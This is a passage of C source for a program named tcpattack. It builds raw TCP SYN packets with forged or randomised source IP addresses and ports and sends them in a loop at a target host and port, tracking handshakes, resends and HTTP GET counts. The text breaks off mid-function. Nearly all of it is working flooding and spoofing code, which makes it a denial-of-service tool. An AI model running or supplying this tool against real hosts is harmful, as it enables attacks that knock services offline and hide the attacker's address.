/*
	gcc -g -w tcpattack.c -o tcpattack -lpthread
*/
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <signal.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <getopt.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <pthread.h>
#include <sys/types.h>
#include <fcntl.h>

#include <assert.h>
#include <stdbool.h>
#include <stdio.h>
#include <netdb.h> 
#include <unistd.h>
#include <sys/ioctl.h>

#define LOGFILE 	  "./tcpattack.log"
#define _MAX_SOCKFD_COUNT 300
#define SOCKETNUM	  25    //epoll
#define TCPSOCKETNUM	  100    //epoll
#define TRUEFLAG	  1
#define HTTPGETCOUNT	  10

#define SYN_STATUS	  1
#define SYNACK_STATUS 	  2
#define ACK_STATUS	  3
#define FIN_STATUS	  4
#define FINACK_STATUS	  5

#define SPECIFYPORT	  0
#define RANDOMPORT	  1
#define RANGEPORT	  2
#define SPECIFYSRCIP      1

#define RESEND_SYN              1
#define RESEND_ACK_FOR_SYNACK   2
#define RESEND_FIN              3
#define RESEND_ACK_FOR_FINACK   4
#define RESEND_RST              5
#define RESENF_HTTP_GET         6

pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER; 

#define STATUS_LIST_HASH_SIZE   65535 * 254 *5
typedef uint32_t ipv4_t;
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

typedef enum _EPOLL_USER_STATUS_EM
{
    FREE = 0,
    CONNECT_OK = 1,//连接成功  
    SEND_OK = 2,//发送成功  
    RECV_OK = 3,//接收成功

}EPOLL_USER_STATUS_EM;

struct tcp_options
{
  u_int8_t op0;
  u_int8_t op1;
  u_int8_t op2;
  u_int8_t op3;
  u_int8_t op4;
  u_int8_t op5;
  u_int8_t op6;
  u_int8_t op7;
};

struct UserStatus
{
    EPOLL_USER_STATUS_EM iUserStatus;
    int iSockFd;//用户状态关联的socketfd 
    char cSendbuff[1024];//[sizeof(struct iphdr) + sizeof(struct tcphdr) + struct tcp_options];
    int iBuffLen;
    unsigned int uEpollEvents;
    char cSendSrcIp[16];
    unsigned int cSendSrcPort; 

    unsigned int cSynSeq;
    unsigned int cSynAck;

    unsigned int cSynAckSeq;
    unsigned int cSynAckAck;

    unsigned int cAckSeq;
    unsigned int cAckAck;

};

struct HttpStatus
{
    EPOLL_USER_STATUS_EM iUserStatus;
    int iSockFd;
    char cSendbuff[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    int iBuffLen;
    unsigned int uEpollEvents;
    char cSendSrcIp[16];
    unsigned int cSendSrcPort;

    unsigned int cSynSeq;
    unsigned int cSynAck;

    unsigned int cSynAckSeq;
    unsigned int cSynAckAck;

    unsigned int cAckSeq;
    unsigned int cAckAck;
};

struct tcp_status
{
    unsigned long ipaddr;
    unsigned int port;
    int socket;

    unsigned int synFlag;
    unsigned int synAckFlag;
    unsigned int ackFlag;

    unsigned int rstFlag;

    unsigned int finFlag;
    unsigned int sFinAckFlag;
    unsigned int rFinAckFlag;
    unsigned int sAckForFinFlag;

    unsigned long seq;
    unsigned long ack_num;
    
    unsigned long cSynSeq;
    unsigned long cSynAck;

    unsigned long cSynAckSeq;
    unsigned long cSynAckAck;

    unsigned long cAckSeq;
    unsigned long cAckAck;

    unsigned long cFinSeq;
    unsigned long cFinAck; 

    unsigned long cFinAckSeq;
    unsigned long cFinAckAck;

    unsigned long cFinBackAckSeq;
    unsigned long cFinBackAckAck;

    unsigned int cRstSeq;
    unsigned int cRstAck;

    unsigned int reSendNum;
    unsigned int reSendType;

    struct tcp_status *next;
};

int httpGetNum;
int httpRespondNum;
int httpRespond302Num;
int httpRespondErrorNum;
int httpJumpGetNum;
int httpGetKeepAlive;

struct http_status
{
    unsigned long ipaddr;
    unsigned int port;

    unsigned int getFlag;
    unsigned int respondFlag;
    unsigned int jump302Flag;
    int socket;
    unsigned int synFlag;
    unsigned int synAckFlag;
    unsigned int ackFlag;
    
    unsigned int rstFlag;

    unsigned int finFlag;
    unsigned int sFinAckFlag;
    unsigned int rFinAckFlag;
    unsigned int sAckForFinFlag;

    unsigned long seq;
    unsigned long ack_num;

    unsigned long cSynSeq;
    unsigned long cSynAck;

    unsigned long cSynAckSeq;
    unsigned long cSynAckAck;

    unsigned long cAckSeq;
    unsigned long cAckAck;
    unsigned int httpResFlag;

    struct http_status *next;
};

struct http_status *g_http_status_list[STATUS_LIST_HASH_SIZE];

struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};
struct tcp_status *g_tcp_status_list[STATUS_LIST_HASH_SIZE];

int srcIpCount = 0;
int multiIp = 0;
int m_iUserCount;                       //用户数量；  
int m_iEpollFd;                         //需要创建epollfd  
struct UserStatus *m_pAllUserStatus;    //用户状态数组  
struct HttpStatus *m_pHttpUserStatus;   //http状态数组

int m_iSockFd_UserId[_MAX_SOCKFD_COUNT];//将用户ID和socketid关联起来  
int m_HttpSockFd_UserId[_MAX_SOCKFD_COUNT];//将http ID和socketid关联起来  

char dstIpBuf[100];                     //目的ip地址
int d_iPort;                            //目的端口号 
 
//int src_iPort;
char srcIpBuf[512][512];		//源ip地址buffer
char s_iPort[32];			//源port
int sPortType = 0;			//源port类型，random/range/port

int srcPortNum;				//源port个数
int startPort;				//源起始port
int attackEndPort;			//源攻击port结束port
int endPort;				//源最终port
int currentPort;			//源当前port
int httpStartPort;			//http get 起始地址

int windowFlag = 0;
int windowSize = 5840;			//默认window大小

int socketfd[5];
int socketHttpfd[10];
int rst_socketfd;
int finFlag = 0;
int rstFlag = 0;

int httpLoopGetFlag = 0;
int http302Redirect = 0;
int httpGetFlag = 0;
char httpGetUrl[256] = "";
char httpGetHead[256] = "";
char httpGetHost[256] = "";

int resendFlag = 0;
int resendFlowNum = 0;
int resendNum = 0;
int resendType = 0;

int threeHandshakeNum = 0;
int sendSynPacketNum = 0;
int recvSynAckPacketNum = 0;
int sendAckPacketNum = 0;

int sendFinPacketNum = 0;
int sendRstPacketNum = 0;
int recvFinAckPacketNum = 0;
int sendAckForFin = 0;

pthread_t thrd_check_connect;
pthread_t thrd_check_httpack;
pthread_t thrd_check_fin;
pthread_t thrd_check_rst;
pthread_t thrd_check_resend;
pthread_t thrd_check_recv_packet[10];
pthread_t thrd_check_httpget_packet[10];
pthread_t thrd_http_get;
pthread_t thrd_while_read;
pthread_t thrd_check_statistics_packet;

int httpSocket[65535] = {-1};
/*struct http_socket
{
    int socket;
    unsigned long ipaddr;
    unsigned int port;
};    
struct http_socket httpSocket[65535];
*/

char* netmask_len2str(int mask_len, char* mask_str)
{
    int i;
    int i_mask;

    for (i = 1, i_mask = 1; i < mask_len; i++)
    {
        i_mask = (i_mask << 1) | 1;
    }
    i_mask = htonl(i_mask << (32 - mask_len));
    strcpy(mask_str, inet_ntoa(*((struct in_addr *)&i_mask)));

    return mask_str;
}

int DelEpoll(int iSockFd)
{
    int bret = 0;
    struct epoll_event event_del;
    if(0 < iSockFd)
    {
        event_del.data.fd = iSockFd;
        event_del.events = 0;
        if( 0 == epoll_ctl(m_iEpollFd, EPOLL_CTL_DEL, event_del.data.fd, &event_del) )
        {
            bret = 1;
        }
        else
        {
            printf("[SimulateStb error:] DelEpoll,epoll_ctl error,iSockFd: %d\n", iSockFd);
        }
        m_iSockFd_UserId[iSockFd] = -1;
    }
    else
    {
        bret = 1;
    }
    return bret;
}

int CloseUser(int iUserId)
{
    close(iUserId);
    return 1;
}

int hash_key_function(unsigned long key, int port)
{
    return htonl(key + port) % (STATUS_LIST_HASH_SIZE);
}

struct tcp_status *lookup(unsigned long ipaddr, unsigned int port)
{
    unsigned int hashIndex = hash_key_function(ipaddr, port);
    struct tcp_status *item = g_tcp_status_list[hashIndex];

    for(;item != NULL;item = item->next)
    {
        if(item->ipaddr == ipaddr && item->port == port)
        {
        return item;
	    }
    }
    return NULL;
}

struct http_status *lookupHttp(unsigned long ipaddr, unsigned int port)
{
    //pthread_mutex_lock(&lock);
    unsigned int hashIndex = hash_key_function(ipaddr, port);
    struct http_status *item = g_http_status_list[hashIndex];

    for(;item != NULL;item = item->next)
    {
        if(item->ipaddr == ipaddr && item->port == port)
        {
            return item;
        }
    }
    //pthread_mutex_unlock(&lock);
    return NULL;
}

int clear_node_hash_table(unsigned long ipaddr, int port, unsigned long seq, unsigned ack_num, int fd)
{
    unsigned int hashIndex;
    struct tcp_status *item;
    if((item = lookup(ipaddr, port)) == NULL)
    {
        hashIndex = hash_key_function(ipaddr, port);
        item = (struct tcp_status*)malloc(sizeof(struct tcp_status));
        if(item == NULL)
            return 0;
        item->ipaddr = ipaddr;
        item->port = port;
        item->synFlag = 1;
        item->socket = fd;
        item->next = g_tcp_status_list[hashIndex];
        g_tcp_status_list[hashIndex] = item;
    }
    else
    {
        item->synFlag = 0;
        item->synAckFlag = 0;
        item->ackFlag = 0;
        item->synFlag = 0;

        item->finFlag = 0;
        item->sFinAckFlag = 0;
        item->sAckForFinFlag = 0;

        item->ipaddr = ipaddr;
        item->port = port;
        item->socket = fd;
    }
    if(item->ipaddr ==0 && item->port ==0) return 0;
    return 1;
}

int set_resend_hash_table(unsigned long ipaddr, int port, unsigned long num, unsigned type)
{
    unsigned int hashIndex;
    struct tcp_status *item;
    if((item = lookup(ipaddr, port)) == NULL)
    {
        hashIndex = hash_key_function(ipaddr, port);
        item = (struct tcp_status*)malloc(sizeof(struct tcp_status));
        if(item == NULL)
            return 0;
        item->ipaddr = ipaddr;
        item->port = port;
        item->reSendNum = num;
        item->reSendType = type;

        item->next = g_tcp_status_list[hashIndex];
        g_tcp_status_list[hashIndex] = item;	
    }
    else
    {
        if(item->reSendNum == 0 && item->reSendType == 0)
        {
            item->reSendNum = num;
            item->reSendType = type;
        }
    }
    if(item->ipaddr ==0 && item->port ==0) return 0;
    return 1;
}

int update_httpget_hash_table(unsigned long ipaddr, int port, int flag)
{
    if(flag == 1)
    {
        unsigned int hashIndex;
        struct http_status *item;
        if((item = lookupHttp(ipaddr, port)) == NULL)
        {
            hashIndex = hash_key_function(ipaddr, port);
            item = (struct http_status*)malloc(sizeof(struct http_status));
            if(item == NULL)
                return 0;
            item->ipaddr = ipaddr;
            item->port = port;
            item->getFlag = 1;
            //sendSynPacketNum++;
            item->next = g_http_status_list[hashIndex];
            g_http_status_list[hashIndex] = item;
        }
        else
        {
            item->ipaddr = ipaddr;
            item->port = port;
            item->getFlag = 1;
            //sendSynPacketNum++;
        }
        if(item->ipaddr ==0 && item->port ==0) return 0;
    }
    else
    {
        unsigned int hashIndex;
        struct http_status *item;

        hashIndex = hash_key_function(ipaddr, port);
        item = g_http_status_list[hashIndex];

        for(;item != NULL;item = item->next)
        {
            if(item->ipaddr == ipaddr && item->port == port)
            {
                item->getFlag = 1;
            }	
        }
    }
}

int update_syn_hash_table(unsigned long ipaddr, int port, unsigned long seq, unsigned ack_num, int fd, int flag)
{
    unsigned int hashIndex;
   
    if(flag == 1)
    {
        struct http_status *item;
        if((item = lookupHttp(ipaddr, port)) == NULL)
        {
            hashIndex = hash_key_function(ipaddr, port);
            item = (struct http_status*)malloc(sizeof(struct http_status));
            if(item == NULL)
                return 0;
            item->ipaddr = ipaddr;
            item->port = port;
            item->synFlag = 1;
            item->cSynSeq = seq;
            item->cSynAck = ack_num;
            item->socket = fd;
            sendSynPacketNum++;
            item->next = g_http_status_list[hashIndex];
            g_http_status_list[hashIndex] = item;
        }
        else
        {
            item->ipaddr = ipaddr;
            item->port = port;
            item->synFlag = 1;
            item->cSynSeq = seq;
            item->cSynAck = ack_num;
            item->socket = fd;
            sendSynPacketNum++;
        }
        if(item->ipaddr ==0 && item->port ==0) return 0;
    }
    else
    {
        struct tcp_status *item;
        if((item = lookup(ipaddr, port)) == NULL)
        {
            hashIndex = hash_key_function(ipaddr, port);
            item = (struct tcp_status*)malloc(sizeof(struct tcp_status));
            if(item == NULL)
                return 0;
            item->ipaddr = ipaddr;
            item->port = port;
            item->synFlag = 1;
            item->cSynSeq = seq;
            item->cSynAck = ack_num;
            item->socket = fd;
            sendSynPacketNum++;
            item->next = g_tcp_status_list[hashIndex];
            g_tcp_status_list[hashIndex] = item;
        }
        else
        {
            item->synFlag = 1;
            item->cSynSeq = seq;
            item->cSynAck = ack_num;
            item->socket = fd;
            sendSynPacketNum++;
        }
        if(item->ipaddr ==0 && item->port ==0) return 0;
    }
    return 1;
}

int update_synack_hash_table(unsigned long ipaddr, int port, unsigned long seq, unsigned long ack_num, int syn, int ack, int fd, int flag)
{
    if(flag == 1)
    {
        struct http_status *item;
        unsigned int hashIndex;

        hashIndex = hash_key_function(ipaddr, port);
        item = g_http_status_list[hashIndex];

        for(;item != NULL;item = item->next)
        {
            if(item->ipaddr == ipaddr && item->port == port)
            {
                item->synAckFlag = 1;
                item->cSynAckSeq = seq;
                item->cSynAckAck = ack_num;
                item->socket = fd;
                recvSynAckPacketNum++;
            }
        }
    }
    else
    {
	struct tcp_status *item;
	unsigned int hashIndex;

	hashIndex = hash_key_function(ipaddr, port);
	item = g_tcp_status_list[hashIndex];

	for(;item != NULL;item = item->next)
        {
            if(item->ipaddr == ipaddr && item->port == port)
            {
                item->synAckFlag = 1;
                item->cSynAckSeq = seq;
                item->cSynAckAck = ack_num;
                item->socket = fd;
                recvSynAckPacketNum++;
            }
        }
    }
}

int update_ack_hash_table(unsigned long ipaddr, int port, unsigned long seq, unsigned long ack_num, int fd, int flag)
{
    if(flag == 1)
    {
        unsigned int hashIndex;
        struct http_status *item;

        hashIndex = hash_key_function(ipaddr, port);
        item = g_http_status_list[hashIndex];

        for(;item != NULL;item = item->next)
        {
            if(item->ipaddr == ipaddr && item->port == port)
            {
                item->ackFlag = 1;
                item->cAckSeq = seq;
                item->cAckAck = ack_num;
                item->socket = fd;
                threeHandshakeNum++;	
            }
        }
    }
    else
    {
        struct tcp_status *item;
        unsigned int hashIndex;

        hashIndex = hash_key_function(ipaddr, port);
        item = g_tcp_status_list[hashIndex];

        for(;item != NULL;item = item->next)
        {
            if(item->ipaddr == ipaddr && item->port == port)
            {
                item->ackFlag = 1;
                item->cAckSeq = seq;
                item->cAckAck = ack_num;
                item->socket = fd;
                threeHandshakeNum++;
            }
        }
    }
}

int update_fin_hash_table(unsigned long ipaddr, int port, unsigned long seq, unsigned long ack_num, int fd)
{
    unsigned int hashIndex;
    struct tcp_status *item;
    if((item = lookup(ipaddr, port)) == NULL)
    {
        hashIndex = hash_key_function(ipaddr, port);
        item = (struct tcp_status*)malloc(sizeof(struct tcp_status));
        if(item == NULL)
            return 0;
        item->ipaddr = ipaddr;
        item->port = port;
        item->finFlag = 1;
        item->cFinSeq = seq;
        item->cFinAck = ack_num;
        item->socket = fd;
        sendFinPacketNum++;
        item->next = g_tcp_status_list[hashIndex];
        g_tcp_status_list[hashIndex] = item;
    }
    else
    {
        item->finFlag = 1;
        item->cFinSeq = seq;
        item->cFinAck = ack_num;
        item->socket = fd;
        sendFinPacketNum++;
    }
    if(item->ipaddr ==0 && item->port ==0) return 0;
    return 1;
}

int update_fin_ack_hash_table(unsigned long ipaddr, int port, unsigned long seq, unsigned long ack_num, int fd)
{
    unsigned int hashIndex;
    struct tcp_status *item;
    if((item = lookup(ipaddr, port)) == NULL)
    {
        hashIndex = hash_key_function(ipaddr, port);
        item = (struct tcp_status*)malloc(sizeof(struct tcp_status));
        if(item == NULL)
            return 0;
        item->ipaddr = ipaddr;
        item->port = port;
        item->sFinAckFlag = 1;
        item->cFinAckSeq = seq;
        item->cFinAckAck = ack_num;
        item->socket = fd;
        recvFinAckPacketNum++;
        item->next = g_tcp_status_list[hashIndex];
        g_tcp_status_list[hashIndex] = item;
    }
    else
    {
        item->sFinAckFlag = 1;
        item->cFinAckSeq = seq;
        item->cFinAckAck = ack_num;
        item->socket = fd;
        recvFinAckPacketNum++;
    }
    if(item->ipaddr ==0 && item->port ==0) return 0;
    return 1;
}

int update_fin_backack_hash_table(unsigned long ipaddr, int port, unsigned long seq, unsigned long ack_num, int fd)
{
    unsigned int hashIndex;
    struct tcp_status *item;
    if((item = lookup(ipaddr, port)) == NULL)
    {
        hashIndex = hash_key_function(ipaddr, port);
        item = (struct tcp_status*)malloc(sizeof(struct tcp_status));
        if(item == NULL)
            return 0;
        item->ipaddr = ipaddr;
        item->port = port;
        item->sAckForFinFlag = 1;
        item->cFinBackAckSeq = seq;
        item->cFinBackAckAck = ack_num;
        item->socket = fd;
        sendAckForFin++;	
        item->next = g_tcp_status_list[hashIndex];
        g_tcp_status_list[hashIndex] = item;
    }
    else
    {
        item->sAckForFinFlag = 1;
        item->cFinBackAckSeq = seq;
        item->cFinBackAckAck = ack_num;
        item->socket = fd;
        sendAckForFin++;
    }
    if(item->ipaddr ==0 && item->port ==0) return 0;
    return 1;
}

int update_rst_hash_table(unsigned long ipaddr, int port, unsigned long seq, unsigned long ack_num, int fd)
{
    unsigned int hashIndex;
    struct tcp_status *item;
    if((item = lookup(ipaddr, port)) == NULL)
    {
        hashIndex = hash_key_function(ipaddr, port);
        item = (struct tcp_status*)malloc(sizeof(struct tcp_status));
        if(item == NULL)
            return 0;
        item->ipaddr = ipaddr;
        item->port = port;
        item->rstFlag = 1;
        item->cRstSeq = seq;
        item->cRstAck = ack_num;
        item->socket = fd;
        item->next = g_tcp_status_list[hashIndex];
        g_tcp_status_list[hashIndex] = item;
    }
    else
    {
        item->rstFlag = 1;
        item->cRstSeq = seq;
        item->cRstAck = ack_num;
        item->socket = fd;
    }
    if(item->ipaddr ==0 && item->port ==0) return 0;
    return 1;
}

unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}

int createSendPacket(int userNum, int randomFlag, int port, int multi)
{
    struct iphdr *ip;
    struct tcphdr *tcp;
    struct tcp_options *tcpopt;
    struct sockaddr_in addr;
    memset( &addr, 0x0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(d_iPort);
    addr.sin_addr.s_addr = inet_addr(dstIpBuf);

    memset(m_pAllUserStatus[userNum].cSendbuff, 0x0, sizeof(m_pAllUserStatus[userNum].cSendbuff));
    ip = (struct iphdr *)m_pAllUserStatus[userNum].cSendbuff;
    tcp = (struct tcphdr *)(m_pAllUserStatus[userNum].cSendbuff + sizeof(struct iphdr));
    tcpopt = (struct tcp_options *)(m_pAllUserStatus[userNum].cSendbuff + sizeof(struct iphdr) + sizeof(struct tcphdr));

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
    ip->id = htonl(54321); 
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    int srcIpIndex;
    if(multi == 1)
    {
        srcIpIndex = random() % srcIpCount;
        ip->saddr = inet_addr(srcIpBuf[srcIpIndex]);
    }
    else
    {
	strcpy(m_pAllUserStatus[userNum].cSendSrcIp, srcIpBuf[0]);
        ip->saddr = inet_addr(m_pAllUserStatus[userNum].cSendSrcIp);
    }
    ip->daddr = inet_addr(dstIpBuf);
    ip->check = csum ((unsigned short *)m_pAllUserStatus[userNum].cSendbuff, ip->tot_len);

    if(randomFlag == 1)
    {
        m_pAllUserStatus[userNum].cSendSrcPort = random() % 65535;
        tcp->source = htons(m_pAllUserStatus[userNum].cSendSrcPort);
    }
    else if(randomFlag == 0)
    {
        tcp->source = htons(atoi(s_iPort));
    }
    else if(randomFlag == 2)
    {
        m_pAllUserStatus[userNum].cSendSrcPort = port;
        tcp->source = htons(port);
    }
    tcp->dest = addr.sin_port;
    m_pAllUserStatus[userNum].cSynSeq = random() % 65535;
    tcp->seq = htonl(m_pAllUserStatus[userNum].cSynSeq);
    m_pAllUserStatus[userNum].cSynAck = 0;
    tcp->ack_seq = htonl(0);
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->rst=0;
    tcp->psh=0;
    tcp->ack=0;
    tcp->urg=0;
    tcp->window = htons(windowSize);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    tcpopt->op0=1460;
    tcpopt->op1=2;

    char *pseudogram;
    struct pseudo_header psh;

    psh.source_address = ip->saddr;
    psh.dest_address = inet_addr(dstIpBuf);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + sizeof(struct tcp_options);
    pseudogram = malloc(psize);
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcp, sizeof(struct tcphdr)+sizeof(struct tcp_options));

    tcp->check = 0;
    tcp->check = csum((unsigned short*) pseudogram , psize-sizeof(struct pseudo_header));
    m_pAllUserStatus[userNum].iBuffLen = strlen(m_pAllUserStatus[userNum].cSendbuff) + 1;

    struct sockaddr_in source, dest;
    memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = ip->saddr;
    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = ip->daddr;
    char sourceIp[16] = "";
    char destIp[16] = "";
    strcpy(sourceIp, inet_ntoa(source.sin_addr));
    strcpy(destIp, inet_ntoa(dest.sin_addr));

}

int createHttpGetPacket(int userNum, int randomFlag, int port, int multi)
{
    struct iphdr *ip;
    struct tcphdr *tcp;
    struct sockaddr_in addr;
    memset( &addr, 0x0, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(d_iPort);
    addr.sin_addr.s_addr = inet_addr(dstIpBuf);

    memset(m_pHttpUserStatus[userNum].cSendbuff, 0x0, sizeof(m_pHttpUserStatus[userNum].cSendbuff));
    ip = (struct iphdr *)m_pHttpUserStatus[userNum].cSendbuff;
    tcp = (struct tcphdr *)(m_pHttpUserStatus[userNum].cSendbuff + sizeof(struct iphdr));

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
    ip->id = htonl(54321);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    int srcIpIndex;
    if(multi == 1)
    {
        srcIpIndex = random() % srcIpCount;
        ip->saddr = inet_addr(srcIpBuf[srcIpIndex]);
        strcpy(m_pHttpUserStatus[userNum].cSendSrcIp, srcIpBuf[srcIpIndex]);
    }
    else
    {
        ip->saddr = inet_addr(srcIpBuf[0]);
        strcpy(m_pHttpUserStatus[userNum].cSendSrcIp, srcIpBuf[0]);
    }
    ip->daddr = inet_addr(dstIpBuf);
    ip->check = csum ((unsigned short *)m_pHttpUserStatus[userNum].cSendbuff, ip->tot_len);

    if(randomFlag == 1)
    {
        m_pHttpUserStatus[userNum].cSendSrcPort = random() % 65535;
        tcp->source = htons(m_pHttpUserStatus[userNum].cSendSrcPort);
    }
    else if(randomFlag == 0)
    {
        tcp->source = htons(atoi(s_iPort));
    }
    else if(randomFlag == 2)
    {
        m_pHttpUserStatus[userNum].cSendSrcPort = port;
        tcp->source = htons(port);
    }
    tcp->dest = addr.sin_port;
    m_pHttpUserStatus[userNum].cSynSeq = random() % 65535;
    tcp->seq = htonl(m_pHttpUserStatus[userNum].cSynSeq);
    m_pHttpUserStatus[userNum].cSynAck = 0;
    tcp->ack_seq = htonl(0);
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->rst=0;
    tcp->psh=0;
    tcp->ack=0;
    tcp->urg=0;
    tcp->window = htons(windowSize);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    char *pseudogram;
    struct pseudo_header psh;
    psh.source_address = ip->saddr;
    psh.dest_address = inet_addr(dstIpBuf);
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    pseudogram = malloc(psize);
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcp, sizeof(struct tcphdr));

    tcp->check = 0;
    tcp->check = csum( (unsigned short*) pseudogram , psize);
    m_pHttpUserStatus[userNum].iBuffLen = strlen(m_pHttpUserStatus[userNum].cSendbuff) + 1;

    struct sockaddr_in source, dest;
    memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = ip->saddr;
    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = ip->daddr;
    char sourceIp[16] = "";
    char destIp[16] = "";
    strcpy(sourceIp, inet_ntoa(source.sin_addr));
    strcpy(destIp, inet_ntoa(dest.sin_addr));
    
}

int CEpollClient(int userCount, const char* dstIp, const char* dstPort, int srcIpNum)
{
    int i,j=0;
    strcpy(dstIpBuf, dstIp);
    d_iPort = atoi(dstPort);
    m_iUserCount = userCount;
    m_iEpollFd = epoll_create(_MAX_SOCKFD_COUNT);
    m_pAllUserStatus = (struct UserStatus*)malloc(userCount*sizeof(struct UserStatus));
    
    for(i=0; i < userCount; i++)
    {
        m_pAllUserStatus[i].iUserStatus = FREE;
        if(srcIpNum == 1)
            strcpy(m_pAllUserStatus[i].cSendSrcIp, srcIpBuf[0]);
        else
        {   
            if(j <= srcIpNum)
            {
                strcpy(m_pAllUserStatus[i].cSendSrcIp, srcIpBuf[j]);
                j++;
            }
            else
                j = 0;
        }
        if(sPortType == SPECIFYPORT)
            createSendPacket(i, sPortType, 0, 0);
    }
    memset(m_iSockFd_UserId, 0xFF, sizeof(m_iSockFd_UserId));
}

int RunEpollCient()
{
    int i;
    for(i=0; i<m_iUserCount; i++)
    {
        struct epoll_event event;

        m_pAllUserStatus[i].iSockFd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(m_pAllUserStatus[i].iSockFd < 0 )
        {
            printf("[CEpollClient error]: init socket fail\n");
            return;
        }     
        int opt = 1;    
        int bufsize = 50 * 1024;
        int flag1 = setsockopt( m_pAllUserStatus[i].iSockFd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
        int flag2 = setsockopt( m_pAllUserStatus[i].iSockFd, SOL_SOCKET, SO_RCVBUF,&bufsize,sizeof(bufsize));
        if( m_pAllUserStatus[i].iSockFd < 0)
        printf("[epoll client error]: RunFun, connect fail \n");

        unsigned long ul = 1;
        ioctl(m_pAllUserStatus[i].iSockFd, FIONBIO, &ul); //非阻塞

        m_iSockFd_UserId[m_pAllUserStatus[i].iSockFd] = i;//将用户ID和socketid关联起来  
        m_pAllUserStatus[i].iUserStatus = CONNECT_OK;

        event.data.fd = m_pAllUserStatus[i].iSockFd;
        event.events = EPOLLIN|EPOLLOUT|EPOLLET;//EPOLLERR|EPOLLHUP;
        epoll_ctl(m_iEpollFd, EPOLL_CTL_ADD, event.data.fd, &event);
    }

    currentPort = startPort;  
    while(1)
    {
        struct epoll_event events[_MAX_SOCKFD_COUNT];
        char buffer[1024];
        int ifd = 0;
        memset(buffer,0,1024);
        int nfds = epoll_wait(m_iEpollFd, events, _MAX_SOCKFD_COUNT, 100 );
        for (ifd=0; ifd<nfds; ifd++)
        {
            /*if(events[ifd].events & (EPOLLERR|EPOLLHUP)) 
            {
            }*/
            if((events[ifd].events & EPOLLERR) || (events[ifd].events & EPOLLHUP) )
            {
                fprintf (stderr, "epoll error\n");
                printf("epoll error event or epoll hup event %d\n", events[i].events);		
                close (events[ifd].data.fd);
                exit(1);
                continue;
            }

            struct epoll_event event_nfds;
            int iclientsockfd = events[ifd].data.fd;
            int iuserid = m_iSockFd_UserId[iclientsockfd];

            if(events[ifd].events & EPOLLOUT)
            {
                int isendsize = -1;
                unsigned long hashKey;
                unsigned long sIpNum;
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(d_iPort);
                addr.sin_addr.s_addr = inet_addr(dstIpBuf);

                if(sPortType == RANDOMPORT)
                {
                    if(multiIp == 1)	
                        createSendPacket(iuserid, sPortType, 0, 1);
                    else
                        createSendPacket(iuserid, sPortType, 0, 0);
                }
                if(sPortType == RANGEPORT)
                {
                    if(multiIp == 1)
                    {
                        createSendPacket(iuserid, 2, currentPort, 1);
                        currentPort++;
                        if(currentPort == endPort)
                            currentPort = startPort;
                    }
                    else
                    {
                        createSendPacket(iuserid, 2, currentPort, 0);
                        currentPort++;
                        if(currentPort == endPort)
                            currentPort = startPort;
                    }
                }    
                sIpNum = inet_addr(m_pAllUserStatus[iuserid].cSendSrcIp);

                if(CONNECT_OK == m_pAllUserStatus[iuserid].iUserStatus || RECV_OK == m_pAllUserStatus[iuserid].iUserStatus)
                {
                    if(m_pAllUserStatus[iuserid].cSendSrcPort < attackEndPort)
                    {
                        struct tcp_status *item;
                        if((item = lookup(sIpNum, m_pAllUserStatus[iuserid].cSendSrcPort)) == NULL)
                        {
                            update_syn_hash_table(sIpNum, m_pAllUserStatus[iuserid].cSendSrcPort, m_pAllUserStatus[iuserid].cSynSeq,  m_pAllUserStatus[iuserid].cSynAck, m_pAllUserStatus[iuserid].iSockFd, 0);
                            if(resendFlag == 1)
                            {
                                set_resend_hash_table(sIpNum, m_pAllUserStatus[iuserid].cSendSrcPort, resendNum, resendType);
                            }
                        
